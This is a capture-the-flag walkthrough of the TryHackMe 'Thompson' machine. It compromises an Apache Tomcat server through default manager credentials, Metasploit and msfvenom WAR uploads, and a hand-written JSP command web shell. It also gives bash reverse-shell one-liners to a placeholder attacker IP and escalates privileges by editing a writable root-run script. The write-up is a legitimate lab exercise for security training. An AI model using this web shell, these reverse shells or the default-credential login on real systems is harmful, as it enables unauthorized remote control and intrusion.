<html><head>
<style>
    body {
        font-family: Arial, sans-serif;
        max-width: 800px;
        margin: 0 auto;
        padding: 20px;
        line-height: 1.6;
        background-color: #f4f4f4;
    }
    h1, h2, h3 {
        color: #333;
        border-bottom: 2px solid #ddd;
        padding-bottom: 10px;
        margin-bottom: 20px;
    }
    p {
        margin-bottom: 20px;
    }
    img {
        max-width: 100%;
        height: auto;
        display: block;
        margin: 0 auto 20px auto;
    }
    code {
        background-color: #f9f9f9;
        border: 1px solid #ccc;
        padding: 5px;
        border-radius: 5px;
    }
    pre {
        background-color: #333;
        color: #f8f8f2;
        padding: 10px;
        border-radius: 5px;
        overflow-x: auto;
    }
</style>
</head><body><p>Greetings everyone !
Today I would like to analyze the machine named <code>Thompson</code> on <code>TryHackMe</code> platform. Since the challenge was too simple to deal with especially the <code>exploitation</code> phase. I want to show you <code>different techniques</code> to reach post-compromise. Before I begin to solve machine, I want to remind
you about <code>/etc/hosts</code>. I did not showcase how you can add your <code>customized</code> domain instead of using <code>IPv4</code> address every time.</p>

<h2>Reconnaissance:</h2>

<p><code>curl</code> provides a fast overview for web components of the target. Through the usage of port specification, we can observe whether the target port is live or not.</p>

<p><strong>Default port 80</strong>
<code>curl -v tom.thm</code></p>

<p><strong>Customized Port 443 or 8080</strong>
<code>curl -v tom.thm:443/tom.thm:8080</code></p>

<p><img src="./images/1.png" alt="alt text" /></p>

<p>As you can see above, connection was failed on port <code>80</code> and <code>443</code>. Now I also checked for <code>Apache</code>.</p>

<p><img src="./images/2.png" alt="alt text" /></p>

<p>I got the connection and page received the <code>HTTP</code> method body. You can understand it from the image. Moreover, connection was established. Let's check my assumptions on browser :)</p>

<p><img src="./images/3.png" alt="alt text" /></p>

<p><img src="./images/12.png" alt="alt text" /></p>

<p>I was correct about the instance. When you see such default-configuration page of the web server, you should keep in mind that <code>fuzzing</code> must be done.</p>

<p>For the <code>fuzzing</code> part, <code>dirsearch</code> will be enough to check default <code>endpoints</code> for <code>Apache Tomcat</code>.</p>

<p>Run the command below:</p>

<p><code>dirsearch -u http://tom.thm:8080</code></p>

<p><img src="./images/4.png" alt="alt text" /></p>

<p>Let's reach out the <code>/manager</code> because it seems like a configuration path.</p>

<p><img src="./images/5.png" alt="alt text" /></p>

<p>By default <code>Tomcat</code> asking for the valid credentials to login. I tried 5 credentials from <a href="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown">here</a>.</p>

<p>admin:admin
manager:manager
admin:password
tomcat:tomcat
<strong>tomcat:s3cret</strong></p>

<p>The last one worked !
You can also try bruteforce the panel with <code>Burpsuite</code>, <code>THCHydra</code>, `msf module: auxiliary/scanner/http/tomcat<em>mgr</em>login.</p>

<p><img src="./images/6.png" alt="alt text" /></p>

<p>Above image depicts the management console of the <code>Apache Tomcat</code> product.</p>

<h2>Exploitation:</h2>

<p>For the exploitation, I will show you different exploitation techniques especially in manual way:</p>

<ul>
<li>Automated</li>
<li>Manual</li>
</ul>

<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat">Hacktricks</a> provided a beautiful guideline to exploitation approaches towards in both automated and manual ways. In this instance, I was able to upload and run commands remotely known as <code>RCE</code>.</p>

<h3>Automated Exploitation:</h3>

<p><code>Metasploit Framework</code> has a module called <code>exploit/multi/http/tomcat_mgr_upload</code> which automatically uploads a file to target &amp; get reverse shell to the attacker machine.</p>

<p>You should configure <code>RHOST</code>, <code>RPORT</code>, <code>LHOST</code> and <code>LPORT</code>. Furthermore, if <code>Apache</code> requires credentials, do not forget to give them on settings in <code>module</code>.</p>

<p><img src="./images/7.png" alt="alt text" /></p>

<p><img src="./images/8.png" alt="alt text" /></p>

<p>Exploit firstly creating a staged payload then <code>upload</code> it through the page. After that by using <code>multi/handler</code>, it was sending <code>staged payload</code>. If it successes it will <code>undeploy</code> and <code>meterpreter</code> is received from <code>msfconsole</code>.</p>

<p>I deliberately failed at once in order to show you why we are using <code>kiwi</code> module in only <code>Windows</code> platforms.</p>

<p><img src="./images/9.png" alt="alt text" /></p>

<p>As you can see, it was only <strong>COMPATIBLE</strong> with <code>windows x86 or x64</code> platforms.</p>

<p>After that part you can modify the bash script to elevate your privileges or directly read <code>flag.txt</code> whether it occured or not.</p>

<p><img src="./images/10.png" alt="alt text" /></p>

<h3>Manual Exploitation (msfvenom):</h3>

<p>Creating <code>msfvenom</code> payload is also a method to exploit the target:</p>

<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;LHOST_IP&gt; LPORT=&lt;LHOST_IP&gt; -f war -o revshell.war</code></p>

<p><img src="./images/11.png" alt="alt text" /></p>

<p><img src="./images/13.png" alt="alt text" /></p>

<p><img src="./images/6.png" alt="alt text" /></p>

<p>Upload your payload via <code>WAR file to deploy</code> part.</p>

<p>Call <code>netcat</code> listener:</p>

<p><img src="./images/14.png" alt="alt text" /></p>

<p><img src="./images/15.png" alt="alt text" /></p>

<p>Now I got the shell, from that part, let's check the <code>python</code> binary. If we have we can enhance our shell with such payload:</p>

<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p><img src="./images/16.png" alt="alt text" /></p>

<p><img src="./images/24.png" alt="alt text" /></p>

<p><img src="./images/23.png" alt="alt text" /></p>

<p>Finally, by using <code>id.sh</code> you can overwrite it &amp; execute then you can elevate your privileges or you can read <code>flag.txt or root.txt</code> through <code>/root/</code> path.</p>

<h3>Manual Exploitation 2 (Webshell):</h3>

<p>We have to create a file type <code>Javascript Server Pages</code>named <code>index.jsp</code> file exactly because other file names did not work because of the default configuration of <code>Apache Tomcat</code> instance:</p>

<ul>
<li>Embed following code segment to create <code>command</code> prompt for application. This code segment provides <code>user interactive</code> utility for our current session.</li>
</ul>

<p>```
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
&lt;%@ page import="java.io.*" %&gt;
&lt;%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%&gt;</p>

<pre><%=output %></pre>

<p>```</p>

<p>This is what is looks like after deployment of the <code>.war</code> application:</p>

<p><img src="./images/17.png" alt="alt text" /></p>

<p>Let me try few commands:</p>

<p><img src="./images/18.png" alt="alt text" /></p>

<p>HTTP parameters are retrieved by <code>request.getParameter("cmd")</code> and specifically finding <code>cmd</code> parameter's requests. Method allows us to run commands remotely. By default application is vulnerable to <code>RCE</code>.</p>

<p><img src="./images/19.png" alt="alt text" /></p>

<p><img src="./images/20.png" alt="alt text" /></p>

<p>You should also understand how the cmd works in backend. If it is not null, It is creating process with executing command method named exec() then it passes cmd and two consecutive null parameters. After that application receives &amp; reads inputs given by user and add it on Buffer named <code>sI</code>.</p>

<p><code>
if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
</code></p>

<p>By using <code>readLine()</code> method it will reads if it is not <code>null</code> and gathers HTML formatted outputs:</p>

<p><code>
         while((s = sI.readLine()) != null) { output += s+"&lt;/br&gt;"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
</code></p>

<p>Each time <code>output</code> appending <code>s</code> variable, string. Let's pass <code>webshell</code> through command-line:</p>

<p>Reverse shell generation is not hard process to understand simply visit this <a href="https://www.revshells.com/">page</a>.</p>

<p><code>bash -i &gt;&amp; /dev/tcp/YOUR_IP/YOUR_PORT 0&gt;&amp;1</code></p>

<p><code>cd /home/jack; bash -i &gt;&amp; /dev/tcp/YOUR_IP/YOUR_PORT 0&gt;&amp;1</code></p>

<p>Before you execute <code>reverse shell</code> payload, do not forget to deploy netcat listener: </p>

<p><code>nc -lvnp YOUR_PORT</code></p>

<p>Direct command-line reverse shell was not available ,so I can directly reach by powerful command-line</p>

<p><img src="./images/21.png" alt="alt text" /></p>

<p><code>-rwxrwxrwx 1 jack jack 26 Aug 14  2019 /home/jack/id.sh</code></p>

<p>Content of the <code>id.sh</code>:</p>

<p>```</p>

<h1>!/bin/bash</h1>

<p>id &gt; test.txt
```</p>

<p>Now embed a payload that can read <code>/root/flag.txt</code>:</p>

<p><code>cd /home/jack &amp;&amp; echo "cat /root/flag.txt 2&gt;/dev/null" &gt;&gt; id.sh &amp;&amp; ./id.sh</code></p>

<p>Converting our webshell to reverse shell will fix the solution:</p>

<p><img src="./images/22.png" alt="alt text" /></p>

<h3>Manual Exploitation 3 (pre-defined webshell through git repo)</h3>

<p>```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp</p>

<p>go to the path: http://your-ip:8080/backup/cmd.jsp
```</p>

<p>You can reach same result from above.</p>

<h2>Privilege Escalation:</h2>

<p>On <code>/home/jack</code> directory, there is a file called <code>test.txt</code> and <code>id.sh</code>. It appends <code>id</code> command output through <code>test.txt</code>. By appending a command we can escalate our privileges.</p>

<ul>
<li>Directly read flag:</li>
</ul>

<p>```
echo "</p>

<h1>!/bin/bash</h1>

<p>cat /root/root.txt &gt; text.txt" &gt; id.sh
```</p>

<ul>
<li>Get root privileges:</li>
</ul>

<p>Append direct <code>reverse shell</code></p>

<p><img src="./images/25.png" alt="alt text" /></p>

<p><img src="./images/26.png" alt="alt text" /></p>

<p>May The Pentest Be With You ! ! !</p>
</body></html>